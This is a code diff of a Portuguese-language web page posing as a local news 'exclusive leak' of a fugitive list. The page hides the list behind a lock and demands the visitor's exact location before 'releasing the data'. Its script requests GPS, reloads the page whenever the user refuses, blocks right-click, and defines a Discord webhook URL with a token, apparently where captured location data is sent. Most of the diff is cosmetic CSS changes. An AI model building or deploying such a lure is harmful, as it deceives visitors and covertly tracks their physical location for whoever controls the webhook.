@@ -13,7 +13,7 @@
 body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     background-color: #000000; /* Fundo Preto */
-    color: #ffffff; /* Letras Brancas */
+    color: #ffffff; 
     margin: 0;
     padding: 0;
     text-align: center;
@@ -24,66 +24,76 @@ body {
     overflow-x: hidden;
 }
 
-/* --- HEADER CORRIGIDO --- */
+/* --- BANNER SUPERIOR --- */
 .header {
-    background-color: #1a1a1a; 
-    color: white;
-    padding: 15px 10px; /* Padding lateral menor para não empurrar */
-    font-weight: bold;
-    font-size: 1.2em;
-    letter-spacing: 0.5px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.8);
-    position: relative;
-    z-index: 100;
+    width: 100%;
+    background-color: #000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
     border-bottom: 1px solid #333;
 }
 
-.header span.city-text {
-    color: #d32f2f; /* Vermelho */
-    font-weight: 900;
+.banner-topo {
+    display: block;
+    width: 100%;
+    max-width: 900px; 
+    height: auto;
+    object-fit: contain;
+    object-position: center;
+    margin: 0;
+    padding: 0;
 }
 
+/* --- ESTRUTURA PRINCIPAL (SEM SCROLL NO MOBILE) --- */
 .container {
-    padding: 15px; /* Reduzi o padding para dar mais espaço à imagem */
-    max-width: 600px; /* Aumentei um pouco para permitir imagens maiores */
+    padding: 15px 15px 20px 15px;
+    max-width: 600px;
     margin: 0 auto;
-    min-height: 90vh;
-    position: relative;
-    z-index: 50;
+    min-height: calc(100vh - 140px); /* Reserva espaço pro banner */
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    box-sizing: border-box;
 }
 
 .alert-box {
     background-color: #1e1e1e;
-    border-left: 5px solid #d32f2f;
-    padding: 15px;
-    margin-bottom: 20px;
+    border-left: 4px solid #d32f2f;
+    padding: 12px;
+    margin-bottom: 15px;
     text-align: left;
-    font-size: 0.95em;
+    font-size: 0.9em;
     color: #ccc;
+    border-radius: 0 4px 4px 0;
+    width: 100%;
+    box-sizing: border-box;
 }
 
-/* --- CORREÇÃO DA IMAGEM E DO CADEADO --- */
+/* --- IMAGEM CENTRAL AJUSTADA --- */
 .img-container {
     position: relative;
     width: 100%;
     margin-bottom: 20px;
-    border-radius: 8px; /* Bordas mais suaves */
-    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    border-radius: 8px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.8);
     overflow: hidden;
     
-    /* Força uma proporção visual harmoniosa */
-    aspect-ratio: 9/16; 
-    max-height: 500px; /* Limite de altura para não ficar gigante no PC */
+    /* Altura controlada para não estourar a tela */
+    height: 320px; 
+    max-height: 45vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    background-color: #111; /* Cor de fundo enquanto carrega */
+    background-color: #111;
+    border: 1px solid #333;
 }
 
 .final-img {
     width: 100%;
     height: 100%;
-    object-fit: cover; /* Garante que preencha sem distorcer */
+    object-fit: cover;
     display: block;
     transition: opacity 0.5s ease;
 }
@@ -94,47 +104,49 @@ body {
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0,0,0,0.5); /* Escurece um pouco para destacar o cadeado */
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(2px);
     display: flex;
     justify-content: center;
     align-items: center;
-    z-index: 20; /* Z-index alto para ficar ACIMA da imagem */
+    z-index: 20;
     pointer-events: none; 
 }
 
 .lock-icon {
-    background: rgba(255,255,255,0.2);
-    backdrop-filter: blur(4px); /* Mais efeito vidro */
-    color: white;
-    padding: 20px;
+    background: rgba(255,255,255,0.15);
+    padding: 15px;
     border-radius: 50%;
-    font-size: 3em; /* Aumentei o tamanho */
-    box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    box-shadow: 0 0 15px rgba(0,0,0,0.5);
     animation: pulseLock 2s infinite;
-    border: 2px solid rgba(255,255,255,0.3);
+    border: 1px solid rgba(255,255,255,0.2);
 }
 
 @keyframes pulseLock {
-    0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
-    70% { transform: scale(1.1); box-shadow: 0 0 0 15px rgba(255,255,255,0); }
-    100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
 }
 
 .btn-access {
     background: linear-gradient(to bottom, #4caf50, #2e7d32); 
     color: white;
-    padding: 20px;
+    padding: 18px;
     border: none;
     border-radius: 8px;
-    font-size: 1.3em;
+    font-size: 1.2em;
     font-weight: bold;
     cursor: pointer;
     width: 100%;
-    box-shadow: 0 4px 6px rgba(0,0,0,0.5);
+    box-shadow: 0 4px 10px rgba(0,0,0,0.6);
     animation: pulse 1.5s infinite;
     position: relative;
     z-index: 60; 
-    margin-top: 10px;
+    margin-top: auto; /* Empurra para baixo se houver espaço */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
 }
 
 @keyframes pulse {
@@ -145,14 +157,15 @@ body {
 
 .loader {
     display: none;
-    margin-top: 20px;
+    margin-top: 15px;
+    width: 100%;
 }
 .progress-bar-bg {
     background-color: #333;
-    height: 8px;
-    border-radius: 4px;
+    height: 6px;
+    border-radius: 3px;
     overflow: hidden;
-    margin-top: 10px;
+    margin-top: 8px;
 }
 .progress-bar-fill {
     background-color: #4caf50;
@@ -161,9 +174,9 @@ body {
     transition: width 0.4s ease;
 }
 .status-text {
-    margin-top: 10px;
+    margin-top: 8px;
     color: #aaa;
-    font-size: 0.9em;
+    font-size: 0.85em;
 }
 .error-message {
     display: none;
@@ -171,9 +184,11 @@ body {
     border: 1px solid #ef5350;
     padding: 15px;
     border-radius: 4px;
-    margin-top: 20px;
+    margin-top: 15px;
     color: #ff8a80;
     font-weight: bold;
+    width: 100%;
+    box-sizing: border-box;
 }
 .btn-retry {
     background-color: #d32f2f;
@@ -186,45 +201,51 @@ body {
     cursor: pointer;
     width: 100%;
 }
-.shield-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 9999;
-    background: transparent;
-    display: none; 
+
+/* SVG Icons Styles */
+.icon-svg {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
 }
 </style>
 </head>
 <body oncontextmenu="return false;">
 
-<div class="header">MONTE <span class="city-text">CITY</span> - PLANTÃO JUDICIAL</div>
+<div class="header">
+    <img src="image(2).png" alt="Monte City News" class="banner-topo">
+</div>
 
 <div class="container">
-    <h2 style="color: #d32f2f; margin-top: 0; font-size: 1.5em;">■ VAZAMENTO EXCLUSIVO</h2>
-    
+    <!-- Alerta com ícone corrigido -->
     <div class="alert-box">
-        <strong>■■ Atenção:</strong> A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos de outras regiões, confirmamos sua localização exata antes de liberar os dados.
+        <span style="color: #d32f2f; font-weight: bold; margin-right: 5px;">
+            <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        </span>
+        Atenção: A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos de outras regiões, confirmamos sua localização exata antes de liberar os dados.
     </div>
 
-    <!-- Container da Imagem Corrigido -->
+    <!-- Imagem Central Ajustada -->
     <div class="img-container">
         <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
         
         <!-- Overlay do Cadeado -->
         <div id="lock-overlay" class="locked-overlay">
-            <div class="lock-icon">🔒</div>
+            <div class="lock-icon">
+                <svg class="icon-svg" style="width: 40px; height: 40px;" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            </div>
         </div>
     </div>
 
-    <p style="font-weight: bold; margin-bottom: 15px; font-size: 1.1em;">Verifique se você está na área de cobertura:</p>
+    <p style="font-weight: bold; margin-bottom: 10px; font-size: 1em; line-height: 1.4;">Verifique se você está na área de cobertura:</p>
     
-    <button id="btn" class="btn-access" onclick="iniciarVerificacao()">VER LISTA DA MINHA REGIÃO</button>
+    <button id="btn" class="btn-access" onclick="iniciarVerificacao()">
+        <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        VER LISTA DA MINHA REGIÃO
+    </button>
 
     <div id="loader" class="loader">
-        <p id="loader-msg" style="font-weight: bold; color: #fff; margin-bottom: 5px;">Verificando sua posição...</p>
+        <p id="loader-msg" style="font-weight: bold; color: #fff; margin-bottom: 5px; font-size: 0.9em;">Verificando sua posição...</p>
         <div class="progress-bar-bg">
             <div id="progress-bar" class="progress-bar-fill"></div>
         </div>
@@ -233,14 +254,14 @@ body {
 
     <div id="error-msg" class="error-message">
         ■ Localização necessária para acessar a lista exclusiva.<br>
-        <small>Clique no botão abaixo para tentar novamente.</small>
+        <small style="font-weight: normal; color: #ccc;">Clique no botão abaixo para tentar novamente.</small>
         <button class="btn-retry" onclick="reiniciarVerificacao()">■ VERIFICAR NOVAMENTE</button>
     </div>
 </div>
 
 <script>
 // Webhook Discord
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
+const WEBHOOK_URL = "https://discord.com/api/webhook/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
 function updateStatus(msg, percent) {
     document.getElementById('loader-msg').innerText = msg;
@@ -281,7 +302,7 @@ function reiniciarVerificacao() {
     const newUrl = window.location.pathname + '?t=' + Date.now();
     window.history.pushState({path:newUrl}, '', newUrl);
     document.getElementById('error-msg').style.display = 'none';
-    document.getElementById('btn').style.display = 'block';
+    document.getElementById('btn').style.display = 'flex';
     document.getElementById('lock-overlay').style.display = 'flex';
     document.getElementById('lock-overlay').style.opacity = '1';
     document.getElementById('main-image').style.opacity = '1';
@@ -307,7 +328,7 @@ function solicitarGPS(ipFracassou = false) {
         },
         (error) => {
             console.error("Erro GPS:", error);
-            // SE O USUÁRIO NEGAR, REINICIA A PÁGINA (LÓGICA DO CÓDIGO ANTIGO)
+            // SE O USUÁRIO NEGAR, REINICIA A PÁGINA
             if (error.code === 1) {
                 location.reload(); 
             } else {
